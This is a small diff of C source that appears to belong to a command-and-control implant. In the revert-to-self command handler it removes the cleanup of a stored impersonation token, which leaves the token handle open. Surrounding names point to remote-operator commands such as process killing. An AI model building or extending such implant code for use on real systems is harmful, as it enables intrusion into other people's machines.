@@ -860,10 +860,6 @@ void Commander_CmdRev2Self(Commander* self, ULONG commandId, Packer* inPacker, P
 	Packer_Pack32(outPacker, commandId);
 
 	ApiWin->RevertToSelf();
-	if (g_StoredToken) {
-		ApiNt->NtClose(g_StoredToken);
-		g_StoredToken = NULL;
-	}
 }
 
 void Commander_CmdPsKill(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
